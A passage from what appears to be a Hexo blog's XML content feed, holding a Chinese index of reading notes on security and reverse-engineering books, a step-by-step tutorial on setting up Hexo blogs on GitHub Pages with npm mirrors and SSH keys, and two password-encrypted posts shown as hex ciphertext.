a5485540521cf1392e0c380da449d6c8444fe9195dcd62a0421570c9ffe15f455f375fdf60e42107f5545c824f61386ef03939a51ef98768dea17f07b24a6ace34247d348d11073d82d5d370e32762ff9162446e9fd1ef384b10e31a0c64af35b0af670d11a5e0566a3246d61bbe047971c53dac13ee06675f0cfdd8a4d5479bf442a8a078980730475e46f520528a78edf59cc209a3c2dfc0bcd1020393acbe421fa058d20099fd2c3a1a117b1aaec455f56a921350c4d8847e8b62cbe9e6aea5bbf9113acaa0a935f2c850fe3382834e86858902ee62b8ac92d00971dd7fd582fb5b2938ab6cda57650d48e12e9b775bcc07a08638427612da30d3617a8c2307de7a910b76083d2591c2b59199e5d1a4d1b964cdaf19b759ef0c718085c843d295834d37b60303968da95c6dc68c406b8262245c41ebba4a94ea48ef35f6d98bb75421415b6ce8aeff2541ab7d7dba0977a6a5e09fa903fc23421aacac4990a4bb92e5b684af60218b5e30b3446b4f4c9fd038dd145e2e07e28f3ac11d7ad34239f558ca31105a8c610f8532a488b75c34d32e788a752dd4adb7b3dd75d4bca8b7d9c9724f6a6659a28075c62e1948c2243341471ba1ba4455154a3e9606eb9ff1a7444a81d25576ad9c54be3e2f6d3c8796b2deb7a8cd9a7cd7b7075c5b31c49adff11206a381f9fff44a128ff1f7f18dbd477173208a73bd2366f9cd8eb25a8ad4866c42977a95d4b323a14347812f5f9168dfc513a0c2b9a8bc7a7ad99918421e57e36cc2818b5d7f20235c4cfa6294249e32e3366f071b738c6acd68a859c5a04d098771750d772a9226095e567dd18923d9ba4152bcac054fde5eb303cc09b37c111e803629a107abf7332503f77e42eaaef8e155251899e44d1f672d79d296cfbcaae665892741396557ecb628eaaad89822440eeebc6c8e55fd91b842c3a17ac04bc02ed66a8f4e805d030dbbce7f0c11078cfe4150a1a2588272e31bff4816813dde5bc01c11f450841a264b9103c8bc6f97d69f9448045cf555815f5ef8772c70654bdc25345ba33ed1f3795e7032faea56b718147e83e0411277a4d8126a26a78a749ebc0a8cfac682702fb4251bcfd065104346b81049d268809561a7b547781a54ab090c25bdc5a95ef205c309ff320c2d434761d34fdb113d0fc2649fe77c044b2137191a72892fab64a34a59c5ed2c236cf84b88211dd3987b858415376c4868f915f9ae7642ee29cb181ee4f119ef638651d7dab84c09ae94b4deffaa79daeab8fea45b7f88507f404cbb3852d0b333be695881149481437a5cc9f4aeca0625dc5d92b8e61f734a7185cbd28c5bdf1e88157e3d36aafccf247ee35bcaf1df77811b95bbfb39b57c485f721de50dab1904233050831b9deeefb78686a14050975f70349de69c448187e6d837f83d3397e88b9b83de8f6265b1b8a20c448ebf0e9e253f14cd7f896dda7524cf4af997751cc508c45729a196609ea0a2d212c4916821cb7d932d9f5009b7733f0cefe42540c5068700b7ddc87bc0f26ba15f6ecdc257dccdd4863cab9924979620993ca9cdbb1315cdecf8e852923e8267171bfc6692b26d188c36727d3ad56561d563037b2e68715f4d345a270627e7561e7fe69564e874e1f163fb64647d070a527bdeba2ed274db407b001fae12725a2b8bf9c092e03f6be03989803f4c4fbb7d0eef7fd221327ddde85152f94f7226c14215c0c82898aab77b2597c0209b291cd239b20db0cdcaa137bfc5f0cb4134789daa15ffe11ef1e2e15724b6014ee1807b5265eb8b0d9e5f585d55be1f5aee24083f563fbfddeeda6944a71b18eb5fb5f9c9032e9b3ab25b400f1879217b3c740095761bc328180d08ce8c4fad1f5272b12097d40f354eced886fa24bd8d8b38220d6e59965017f2b2f7be489d09258eb203dfc67957de5c7bf0f71590e5abc28bcf6daf5d0a4aa7f924bec5f10f7cc653a55b5ba55c2da70d2599ec9d8ca96b114dd0101291a67011c09aa1691eded02e8f9818ca571cb147c7c55496bafbd90bc48dd4cf9ece33821281b220a68587c34df38c24c219a6dc404b3e0e954581903802ab6a1a33a98b9f9debf184387a1afe819465530177c3fb510dccae55da29455a5be5432dae84a1e6e262b3f5618c442bb713a40aa9108a36c25d6dabb5ba2a8851559bd9f897044566774bb54003199c0fd4fdd8529e66a8236d1b29d8bec44fd542d345951f0063e100a2d0accc09c03fb1f0cc8f20949eeaa2dfa30dd70d882469c2e483e712c92b5282f0bd1269091a6d5c6eab421b8f31080eeced7bcd5b0577423e94eab2ecda7a3311fab15bd87a0d9bab78f27fd333901a3a410f7ea9274e9699145a61e4e4fd0339b471f3c65c08ecade55ac310b95ce22864475cf8a4c5364263c9d80bbbb2ed0fb6dd9f993ac10a4cf21334ee4c4cc4fa1da5067e5914aed4f0175acb04ef69c2c6427d41c3b3eceeac4c9cb33bc369663ee16f021959d4229a3fb12008c38e2342672551d0198d3b2f45f9adb2b905a65f7d9720aa250f5b5d8714a84db3f153e55c93ddfe35cf40c2cb7a266d928a8351d5fa7a0deee6e70da49489b97c4cfd9f053af2cfdeae3bcd1cd77f3e99fc25abe5cf693f8f5dd04c29fa9aa71361e922a1d1e91da2b90f587be5dbcd02002c4a9efe8e40cae39d2c29fad74d4b206621ef7c4057d1b6eb03ac189cb9a8e7b99cfaf9884f94662d87123bf2a65d60f5b7a4e7671590f8dd1866a71cceca54f2206739ca5e04ad0c2e449bf5b695a82c969df5d0d251c3865b3e03e4082f73552034713b9aa7b835cb6c603e16d4b120b581a7390690403ec544f50fb4536e3dabe0b9d35c47ee41ec9241f71658677263ce8135d926a7184a66e8e44faca1c32d2281de069c7913a0acedca3c4d283b0731303f446d90848430e0d28fe4ad6d226fe5f36a41f2f7ba6761161329a2ee13ea2574ddafb0fd871f95199332a028fd188adcf74a6940be7905d6aa533f7297e694cb6759dd00af04fa6d84f9aeed8125925b0b23abcdb4a11c5ad87a414fe3797bae3af35b9372e80ad849ffdea656268304cb38680bffde82d64079b7d6aff6d4eebf2fb55d56fda37c9b57d386217e85b2369789d901d8b86a02f1171e660a83ad9bb958a585b7ef457c0fc8bafa366a940732b09f100214cef073edca85ce25ea85bb1fdf02e80fe2cca1cbedc66f48b949ea05ff1157bd7ed3eb3874e84dc56e542b95e6c3f29340c5fc11aaf98783b9445eb9a948e76f62d91f5810ae5e2eac05b84c5f202452ec8bdb409a9d4952cc4df287195b51a97f48eb510350b4016761a789af7d9d556587cb734ac41f667f6dc0f406a41b99b08bbab510b989741b75bc122ec6292aa5c424cff4a588f365be424ec630b13852b12fbbbcf1b2c267e885dac4f9628be9dd49fee1f22a5249ed4dd354a852cb8ef73e661d25039234c20bd4723b722b6a7ccee946a133b22bfd793289d7b40a695f00ba5ab89846d28d9adc699ae13bb1cb438e73c72124fc84683aca518f5c498321b3e450ad8e27cf6f7a6911393f79621fb4510c4cb17a79f70d05dd8fb2e11cf3ea80885a0b9bab37e4a3bf8110cc7e8032ada421e42434aa31a255e66aa1e769028d5490a223f398795b40f8206f08fb04df886c1c7c85ff9e9baa138e96b85eec62143ded8c373981cda60caf5309264eee24310d729acb9c438c6df2fe1da68217856dfbd3e0c0ae5bc44d3f6bbacc06f9cda1f82a37040cd78c80ba6dd155b7ca7a761a6daee1f2d872ddbc3293e58b5dc66951bdaaa4028f24e0c6e2f2a8353e6771f56e4717fc7c183527f7</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>C&amp;C++</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>读书笔记</title>
    <url>/post/column-1/</url>
    <content><![CDATA[<p>漏洞利用技术才是实施有效攻击的最核心技术，才是突破安全边界、实施深度入侵的关键所在。ʕ •ᴥ•ʔ (๑˃̵ᴗ˂̵) ପ( ˘ᵕ˘ ) ੭ </p>
<span id="more"></span>

<h2 id="1-Web-方向"><a href="#1-Web-方向" class="headerlink" title="1 Web 方向"></a>1 Web 方向</h2><ol>
<li><a href="https://directoree.github.io/post/learning-testing-with-python">【Python 测试之道】读书笔记</a></li>
<li><a href="https://directoree.github.io/post/web-basic-safety-guide-uploadfile/">【Web 安全防护指南基础篇-文件上传】读书笔记</a></li>
<li><a href="https://directoree.github.io/post/web-basic-safety-guide-sqlinject/">【Web 安全防护指南基础篇-SQL注入】读书笔记</a></li>
<li><a href="https://directoree.github.io/post/web-basic-safety-guide-xss/">【Web 安全防护指南基础篇-XSS注入】读书笔记</a></li>
<li><a href="https://directoree.github.io/post/sqlinject/">【数据库编译原理和注入】</a></li>
</ol>
<h2 id="2-二进制方向"><a href="#2-二进制方向" class="headerlink" title="2 二进制方向"></a>2 二进制方向</h2><ol>
<li><a href="https://directoree.github.io/post/cssapp_notes-1-2-3/">《深入理解计算机系统 CSS:APP》 读书笔记</a></li>
<li><a href="https://directoree.github.io/post/0day2-1-2/">《0day安全：软件漏洞分析技术（第二版）》读书笔记（1-2）</a></li>
<li><a href="https://directoree.github.io/post/0day2-3-4/">《0day安全：软件漏洞分析技术（第二版）》读书笔记（3-4）</a></li>
<li><a href="https://directoree.github.io/post/encryption-and-cracking-11-PE/">《加密与解密（第四版）PE文件格式》</a></li>
<li><a href="https://directoree.github.io/post/Windows-Kernel-Base/">《Windows内核基础》</a><ul>
<li>《深入解析Windows操作系统（第六版）》</li>
<li>《Windows内核原理与实现》</li>
</ul>
</li>
<li><a href="https://directoree.github.io/post/encryption-and-cracking-1-basic/">《加密与解密》_1_基础知识》</a></li>
<li><a href="https://directoree.github.io/post/encryption-and-cracking-2-ollydbg/">《《加密与解密》_2_动态调试技术_OllyDbg》</a></li>
</ol>
<h2 id="3-书目"><a href="#3-书目" class="headerlink" title="3 书目"></a>3 书目</h2><table>
<thead>
<tr>
<th align="center">分类</th>
<th align="left">书名</th>
<th>列表</th>
</tr>
</thead>
<tbody><tr>
<td align="center">二进制逆向</td>
<td align="left">《深入理解计算机系统》（CSS:APP）</td>
<td>1. <a href="https://directoree.github.io/post/cssapp_notes-1-2-3/">《深入理解计算机系统 CSS:APP》 读书笔记</a></td>
</tr>
<tr>
<td align="center">二进制逆向</td>
<td align="left">《0day安全：软件漏洞分析技术（第二版）》</td>
<td>1. <a href="https://directoree.github.io/post/0day2-1-2/">《0day安全：软件漏洞分析技术（第二版）》读书笔记（1-2）</a><br>2. <a href="https://directoree.github.io/post/0day2-3-4/">《0day安全：软件漏洞分析技术（第二版）》读书笔记（3-4）</a></td>
</tr>
<tr>
<td align="center">二进制逆向</td>
<td align="left">《加密与解密（第四版）》</td>
<td>1. <a href="https://directoree.github.io/post/encryption-and-cracking-11-PE/">《加密与解密（第四版）11_PE文件格式》</a><br/>2. <a href="https://directoree.github.io/post/encryption-and-cracking-1-basic/">《加密与解密》_1_基础知识》</a> <br/>3. <a href="https://directoree.github.io/post/encryption-and-cracking-2-ollydbg/">《加密与解密》_2_动态调试技术_OllyDbg》</a></td>
</tr>
<tr>
<td align="center">二进制逆向</td>
<td align="left">《深入解析Windows操作系统（第六版）》<br />《Windows内核原理与实现》</td>
<td>1. <a href="https://directoree.github.io/post/Windows-Kernel-Base/">《Windows内核基础》</a></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">分类</th>
<th>书名</th>
<th>列表</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Web</td>
<td>《Python 测试之道》</td>
<td>1. <a href="https://directoree.github.io/post/learning-testing-with-python">【Python 测试之道】读书笔记</a></td>
</tr>
<tr>
<td align="center">Web</td>
<td>《Web 安全防护指南基础篇》</td>
<td>1. <a href="https://directoree.github.io/post/web-basic-safety-guide-uploadfile/">【Web 安全防护指南基础篇-文件上传】读书笔记</a><br />2. <a href="https://directoree.github.io/post/web-basic-safety-guide-sqlinject/">【Web 安全防护指南基础篇-SQL注入】读书笔记</a><br />3. <a href="https://directoree.github.io/post/web-basic-safety-guide-xss/">【Web 安全防护指南基础篇-XSS注入】读书笔记</a></td>
</tr>
<tr>
<td align="center">Web</td>
<td>数据库编译原理和注入</td>
<td>1. <a href="https://directoree.github.io/post/sqlinject/">【数据库编译原理和注入】</a></td>
</tr>
</tbody></table>
<h2 id="4-Windows-XP-内核视频"><a href="#4-Windows-XP-内核视频" class="headerlink" title="4 Windows XP 内核视频"></a>4 Windows XP 内核视频</h2><p>3期参考：</p>
<ul>
<li>Win32编程：《Windows核心编程第5版》</li>
<li>硬编码：《Intel x86开发手册卷1》</li>
</ul>
<p>中级参考：</p>
<ul>
<li>保护模式：《Intel x86开发手册卷2》</li>
<li>驱动开发：《Windows内核原理与实现-潘爱民》</li>
</ul>
<table>
<thead>
<tr>
<th align="center">章节</th>
<th>分类</th>
<th>列表</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1.保护模式</td>
<td>1. 段保护</td>
<td>1. <a href="https://directoree.github.io/post/WinXP-ProtectionMode-Segment/">Windows XP 段保护（一）</a><br />2. <a href="https://directoree.github.io/post/WinXP-ProtectionMode-Segment2/">Windows XP 段保护（二）</a><br />3. <a href="https://directoree.github.io/post/WinXP-ProtectionMode-Segment3/">Windows XP 段保护（三）</a></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>读书笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo+Github博客搭建终极大法</title>
    <url>/post/createGithubblog/</url>
    <content><![CDATA[<p>2019.2.26更新<br>最近有同学、朋友问我详细的Hexo+Github Pages Blog搭建，加之我把我这几个月来的一些使用技巧和方法总结一下。为什么要今天来更新一下呢？<br>因为26对我来说是个特别的日子…..</p>
<span id="more"></span>




<p><font face="楷体">边听边看吧😊</font></p>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=32705017&auto=0&height=66"></iframe>

<p><font face="宋体"></font></p>
<h3 id="一、-前言"><a href="#一、-前言" class="headerlink" title="一、 前言"></a><font color="#FF6347" face="Comic sans MS">一、 前言</font></h3><p><font face="宋体">&amp;emsp;很早之前就想到要拥有自己的一个个人博客，最初想到的是CSDN，除了会员，无奈广告太多。接着考虑过博客园，但是不太喜欢它的UI……最终经朋友推荐了Github博客。经过大致几个小时的Search关于Github博客有关的东西之后，发现里面的背景、字体、高亮代码等等的所有东西全部都可以DIY，对于一个喜欢美丽事物的我来说确实喜欢上了。好了，话不多说了，接下来谈谈建立这个博客的辛酸过程吧……<br></font></p>
<blockquote>
<p>要有一个良好的使用习惯，包括但不限于：</p>
</blockquote>
<ol>
<li>写自己博客创建方法。博客搭建好后可以写写自己搭建过程中遇到的问题以及解决方法；</li>
<li>解决报错信息。初次搭建博客的过程是很麻烦的，特别对于git的报错，或者是hexo安装过程遇到的一系列问题，我的建议是：将报错信息复制到Google或者百度找解决方法，或者将错误截图和原因告诉已经搭建好博客的人，请教他们是如何解决类似问题的；</li>
<li>创建更新日志。为自己的博客写一个更新日志，内容可以包含：更新内容、时间、原因、目的、方法，以及更新过程中遇到的问题是怎样解决的，这个习惯非常好，以后能非常便捷地帮助自己了解到博客的变化，以及自身积累的一个过程；</li>
<li>初始创建好博客文件夹后可以复制一份保留好，以便后续可能使用到(极大可能会使用)；</li>
<li>站点目录下的_config文件可以多复制几份，但是要方便区分；<br>……</li>
</ol>
<p>&amp;emsp;<br>最近我重新又搭建了一个博客，实现了一台电脑搭建多个博客并部署到远程Github仓库。<br>但是这个过程也是非常痛苦的，因为网上的教程我几乎都试了，但是没有一个是成功的……下面我会分别谈谈搭建一个、多个博客的详细过程。<br>前提是第一个博客博客要搭建好，其余的就非常简单了！ (。・∀・)ノ</p>
<p>&amp;emsp;</p>
<h3 id="二、-搭建第一个博客"><a href="#二、-搭建第一个博客" class="headerlink" title="二、 搭建第一个博客"></a><font color="#FF6347" face="Comic sans MS">二、 搭建第一个博客</font></h3><h4 id="2-1-搭建方式"><a href="#2-1-搭建方式" class="headerlink" title="2.1 搭建方式"></a><font color="#3CB371" face="Comic sans MS">2.1 搭建方式</font></h4><blockquote>
<p>Hexo+Github、Jekyll+Github</p>
</blockquote>
<p><font face="宋体">&amp;emsp;至于使用哪一种方式，网上看了许多帖子、视频、博客……大部分是使用Hexo，后来自己网上找了许多原因，发现Hexo官网提供了非常丰富的主题和插件，加上好维护，最终我选择了Hexo来搭建。</font></p>
<h4 id="2-2-搭建需要的工具"><a href="#2-2-搭建需要的工具" class="headerlink" title="2.2 搭建需要的工具"></a><font color="#3CB371" face="Comic sans MS">2.2 搭建需要的工具</font></h4><blockquote>
<p><font face="Arail">1. 安装node.js </font><br><font face="Arail">2. 安装Git </font><br><font face="Arail"> 3. 安装Hexo</font><br><font face="Arail"> 4. 安装Hexo依赖</font><br><font face="Arail"> 5. 安装代码编辑工具，推荐Sublime Text(官网下载)</font></p>
</blockquote>
<h4 id="2-3-搭建过程"><a href="#2-3-搭建过程" class="headerlink" title="2.3 搭建过程"></a><font color="#3CB371" face="Comic sans MS">2.3 搭建过程</font></h4><h5 id="步骤一、那就是先注册自己的Github账号了"><a href="#步骤一、那就是先注册自己的Github账号了" class="headerlink" title="步骤一、那就是先注册自己的Github账号了"></a><font color="#2196f3" face="Comic sans MS">步骤一、那就是先注册自己的Github账号了</font></h5><p>先看完下面文字再点击视频链接去注册。</p>
<blockquote>
<p>1.进入<a href="https://github.com/%E7%82%B9%E5%87%BB%E6%B3%A8%E5%86%8C%E3%80%82%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9%EF%BC%9A">https://github.com/点击注册。注意事项：</a><br>    1）一个用户名、邮箱只能注册一次；<br>    2）Github会限制浏览器，推荐Chrome、Firefox；<br>    3）邮箱验证，通过了才能继续下面事项。</p>
</blockquote>
<blockquote>
<p>2.关于取名：<br>    1）比如我的用户名是Treecatee,相应的仓库取名推荐为Treecatee.github.io，否则后续使用Treecatee.github.io在浏览器访问时报错404；那如果我非要取其他名可以么？可以的，比如我取名为Directoree.github.io，那么在浏览器输入应该为Treecatee&#x2F;Directoree.github.io，这样就可以了，不过URL很长…..<br>    2）GitHub Pages 建好后需要将Branch改为master，然后在下面接着选一个theme，不然会访问不了Treecatee.github.io</p>
</blockquote>
<p><font face="宋体">&amp;emsp;到<a href="https://github.com/">Github官网</a>注册账号，过程还是有些繁琐的，那就推荐到这个视频看看怎么注册吧…..<br><a href="https://www.bilibili.com/video/av24897960?p=2">Github注册账号视频（点我）</a>。 </font></p>
<h5 id="步骤二、-安装node-js"><a href="#步骤二、-安装node-js" class="headerlink" title="步骤二、 安装node.js"></a><font color="#2196f3" face="Comic sans MS">步骤二、 安装node.js</font></h5><p><font face="宋体">&amp;emsp;<a href="https://nodejs.org/zh-cn/">官网下载</a>node，或者使用<a href="https://npm.taobao.org/">淘宝镜像源下载</a>。安装好了后到命令行试试是否成功安装了，方法：打开命令行（Win+R）,输入cmd，打开命令行后输入node -v，如果显示版本则安装成功，否则重新安装。  </font></p>
<h5 id="步骤三、-安装Git（第一坑）"><a href="#步骤三、-安装Git（第一坑）" class="headerlink" title="步骤三、 安装Git（第一坑）"></a><font color="#2196f3" face="Comic sans MS">步骤三、 安装Git（第一坑）</font></h5><p><font face="宋体">&amp;emsp;1.网上的教程都是直接到<a href="https://git-scm.com/downloads">Git官网</a>直接下载，后来到了官网后发现官网根本就不能下载了，这不是坑人么？后来找了很多方法，发现官网已经停止维护更新了，那就得使用其他途径了。推荐<a href="https://npm.taobao.org/mirrors/git-for-windows/">淘宝镜像</a>，或者到CSDN搜索一下复制链接给淘宝客服帮助你下载（土豪行为）🤭<br>&amp;emsp;2.安装好了后到命令行试试是否成功安装了，方法：打开命令行（Win+R）,输入cmd，打开命令行后输入git，如果显示有相应信息则安装成功，否则重新安装。<br></font></p>
<h5 id="步骤四、-使用Git创建SSH-RSA密钥复制到自己的Github仓库"><a href="#步骤四、-使用Git创建SSH-RSA密钥复制到自己的Github仓库" class="headerlink" title="步骤四、 使用Git创建SSH-RSA密钥复制到自己的Github仓库"></a><font color="#2196f3" face="Comic sans MS">步骤四、 使用Git创建SSH-RSA密钥复制到自己的Github仓库</font></h5><p><font face="宋体">&amp;emsp;注意事项：生成密钥的过程会提示是否需要输入密码？按回车默认不需要就可以了，后面一个提示是生成的密钥的文件保存路径，你可以更改也可以不改。创建方法参见：<a href="https://www.bilibili.com/video/av24897960?p=4">点我看视频</a>。</font></p>
<h5 id="步骤五、-非常重要的一步，创建Hexo（第二坑）"><a href="#步骤五、-非常重要的一步，创建Hexo（第二坑）" class="headerlink" title="步骤五、 非常重要的一步，创建Hexo（第二坑）"></a><font color="#2196f3" face="Comic sans MS">步骤五、 非常重要的一步，创建Hexo（第二坑）</font></h5><blockquote>
<ol>
<li>建立一个Blog文件夹；</li>
<li>在Blog文件夹下右键选中Git Bash Here打开Git,输入更换安装源的路径命令<code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code>，然后输入<code>npm install hexo-cli -g</code>-g是安装到全局；</li>
<li>安装好Hexo后，接着输入<code>hexo init Directoree</code>“Directoree”是博客名，这一步创建博客本地站点文件；Directoree文件夹被创建好后，将其复制一份到其他路径下，方便以后用；</li>
<li>到Blog&#x2F;Directoree右键选中Git Bash Here打开Git,输入<code>npm install</code>安装依赖。</li>
</ol>
</blockquote>
<p><font face="宋体">&amp;emsp;注意事项：Hexo创建不成功的话是无法搭建博客的，注意创建在目录的位置哦！创建方法参见：<a href="https://www.bilibili.com/video/av24897960?p=5">点我看视频</a>后发现创建失败啊。哈哈，那是因为目前国内npm源有问题，所以推荐使用淘宝镜像，代码参考<a href="https://www.cnblogs.com/qq597585136/p/6964599.html">关于HEXO安装失败的解决方法</a>，如果连接不能跳转则使用下面代码即可：</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br><span class="line">cnpm install hexo-cli -g</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="宋体">&amp;emsp;注意事项：Hexo依赖不成功安装的话是无法搭建博客的，注意创建在目录的位置哦！！！发现创建失败啊。哈哈，那是因为目前国内npm源有问题，所以推荐使用淘宝镜像，使用下面代码即可：</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>
<p><font face="宋体">&amp;emsp;安装好了后就赶紧试试自己的第一篇博客文章吧，在命令行输入：hexo g -s 本地查看一下，参见<a href="https://www.bilibili.com/video/av24897960?p=5">视频</a>。<br></font></p>
<h5 id="步骤六、-下载安装Sublime-Text软件"><a href="#步骤六、-下载安装Sublime-Text软件" class="headerlink" title="步骤六、 下载安装Sublime Text软件"></a><font color="#2196f3" face="Comic sans MS">步骤六、 下载安装Sublime Text软件</font></h5><p><font face="宋体">&amp;emsp;该软件用于编辑代码等，当然也可以使用其他软件，推荐<a href="https://www.sublimetext.com/">下载地址</a>，点击DOWNLOAD FOR WINDOWS。然后就可以编辑提交文章到自己的博客了啊。如果<code>hexo g</code>时报错远程端连接不上的话，是因为网络问题，多试几次就好了。<br>常用的提交命令：</font></p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hexo</span> cl</span><br><span class="line">hexo g</span><br><span class="line">hexo s   （这个是本地查看）</span><br><span class="line">hexo d   （这个是部署到自己的博客）</span><br></pre></td></tr></table></figure>
<p>  哈哈哈，就这样自己的博客初步搭建好了</p>
<p><font face="楷体">  至于主题替换以及里面插件的使用后续再更吧……😊</font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="三、-搭建第二个博客"><a href="#三、-搭建第二个博客" class="headerlink" title="三、 搭建第二个博客"></a><font color="#FF6347" face="Comic sans MS">三、 搭建第二个博客</font></h3><p><font color="#FF7F00"><strong>创建多个博客其实按照逻辑来并不难，难点是在于远程部署文章的时候的解决方法。其实实际也就是使用本地RSA密钥要使用正确。</strong></font></p>
<blockquote>
<ol>
<li>注册GitHub账号；并注意这个时候的SSH-RSA密钥创建的时候我们可以另选一个路径先暂时保存一下，比如桌面；</li>
<li>Git、node.js不需要再次安装；</li>
<li>可以将上述复制的博客文件直接拿来用。<br> 1）如果没有复制。则需要检查Hexo是否在新的博客路径下可用，不可用的话重新在新的路径下安装，安装方法参照上面，安装好Hexo后，接着输入<code>hexo init Directoree</code>“Directoree”是博客名，接着安装依赖；<br> 2）如果复制了。需要再安装一个Hexo依赖，否则你会发现<code>hexo cl</code>等命令不能用。</li>
</ol>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;<br><strong>如果不解决RSA的问题报错如下：</strong></p>
<p><img data-src="https://i.loli.net/2019/02/26/5c74efb9ac932.png" alt="VF.png"></p>
<p>&amp;emsp;<br>&amp;emsp;<br><strong>解决方法：</strong><font color="red"><strong>部署哪一个博客就使用该博客对应的RSA密钥对！！！</strong></font><br>网上那些方法我都试了但是没有一个能解决实际情况，所以下面的解决方法绝对适用于每一个人！！！</p>
<p>&amp;emsp;<br>保存RSA密钥的默认路径是<code>C:\Users\Alvin\.ssh</code>，可以看到里面的id_rsa、id_rsa.pub密钥对是第一个博客的，当我们需要部署第二个博客到远程仓库时就需要使用到第二个博客的密钥对，这个时候我们可以在<code>C:\Users\Alvin\.ssh</code>目录下建立一个文件夹，例如建立<code>用于更换</code>文件夹，将暂时不用的密钥对移动到里面，将需要使用到的密钥对放到<code>C:\Users\Alvin\.ssh</code>目录下即可。<br>&amp;emsp;</p>
<blockquote>
<p>为什么要这样？<br>那是因为密钥对可以选择使用，但是部署到远程仓库是使用的密钥对文件名字必须为<code>id_rsa、id_rsa.pub</code></p>
</blockquote>
<br>

<p><img data-src="https://i.loli.net/2019/02/27/5c76836c999aa.png" alt="B.png"></p>
<p>更换后第二个博客部署成功了，如下：<br><img data-src="https://i.loli.net/2019/02/26/5c74f1f7aad0c.png" alt="O.png"></p>
<p>&amp;emsp;<br>哈哈哈哈(。・∀・)ノ</p>
]]></content>
      <categories>
        <category>Hexo-Github</category>
      </categories>
      <tags>
        <tag>博客搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>CS:APP Data Lab</title>
    <url>/post/csapp_datalab/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="7408ad97d86ffbd6bc87b1f7e9de36a33f520f55574cc6f70a5733c9724495db">65b591f270a691a8bcf50a13db064a056e64f01870518214701f91a06c5401c1afded6cc5d8208cb18fa492a0a4ce66067911504cf8867ff28ebd4a108b1c81e41d215ccc0da22bbc2893858515b9f4f89a6d3b1953c2e4c0e6bd94348d729fa3ffef8a506a6874aeea5795a6f523f4ccb6bf61b99bd75ed7379e7dcaf06c469eba19a0d948380186cd165e2f3b5e12add1a8dad6d85f915c7b7bc530ed6452d133cb3868329b1858a688b731f5a8444036a0487d081ffd9ce02c6462c12feb90c193aae6e2a34a3319f3d56141e9ef4860fa9f423ce65205a6b2a91d48929ad6f3a964e8713157bdd7230104a83a3b04397e6086e2289ea83a8f94fd2de0cb581826b5e33b0a237f2b7892732f732c0db6f10eb0daa24065379611344e12621a23c7276a756d4386b6ff59a0050ac89eea97dd93a1ef1d0f77b33cb161b5201ba992155a5c24d6434a26a3b30bb596c8469079ba2ba1353f5f5c1a3695df051e33c38e0fefba7f55b3dafa2bc3a310839708b672201f26906b76f84f713159e309a70c1f649fafdd3e213ba9a5abf4dfbf434706d33f2e0e62aca783da56b8992e79ae1e3ec6f2a990091a274fd22fdced1a5c95f5f31d9dbb3989e49c4cd47d1cdaca8e20294a23c5612a30cd2f69953bdbbe785847a065c588a5ad4829da970c7cd1d06ab7e0d313e426bbc369a76a37509a2ce93f93bcd6974d0ac0663a9fab9c592e66087f31d857519281814ffac4d926df1f97b0dca6b12568705adc5676417f1559eeff988431f6339bc6f70714600012c82f93deb677d0ad08dd8b76019f9c7f842373cf980d561c44e13778ad56f0578fd25d6882bcf3ab12c8700dfc469a7e53da29e509d6d09186aafd258ce8c70b5e9fc96a0404687ee623b1b7ab6156cb03d79899f07ad17d3126e55d0b328c81f731cd683132c2ccd1cf08e3624170db5ba9be80772686e85ec114aac1fd0cbcc9ea59173b2e5c819219754d77bfbbd269fb9241293d243cd025fb106d69ecbacb26c1a3693fb67b176b7dd16070ee5fe0cfb253bcdba366832c72d2568d68569abab465a3c4e12537312fb0bfcb735ddbd9fa3ee5108b32ac4df01c320d2a1322683d9763e6fd4a1feec3d5ff3fd1fad3ee7d33be1f8b8de02e25de7b344331444795c178e53919ab40674391483f66123639016b38f221c6bbaaf85f996efb9b5c2f9b7d70a5ddb5f2086bb494d7b54a57ce73a2be802992a52b5db376720d52c17be01cd36e6c158a9a33edc308ce7e84b8335fc458625f8f9a0e1b319afc551273f832f3695ef0df922fb5de83f783b65a7a31f5930dc034a6fe93f9e8ebdba3d75725f53b90651434424da8d6a48a1a1ec4f059e3dc7eb2fb06ec9b46153cd2f5cdc66e2f02462483afd643f6c54a293b4dc75b1a64882a91e9bec7cdfb20fc07f280341f01be6367cc9ae29f53b35a01789ec9c3dd6d4868c6c80927d798921ccf80c2f9c5bf8c8ec6768f11a2bb48f06a645614d6bed3e07651ebd0927fded6e54b5fb0e6decabdc8b09464e8904832f2bd9ab77b23303120d51f57da0de9fe3b5a9a08caedfc983a2abe8d154c4ecd81eb484aa9028d220cb9dc7794e385ad1d43c0527768bdb2bd5dd7ffd2076ee3d64a30b2c31fe59d44bb978d9132607853ab1f0f8c945d9e73315f6e4df5c155d0e6b6a2cb411ef4a68587c8196d409ad5ba1d41153b2c6456a13bb6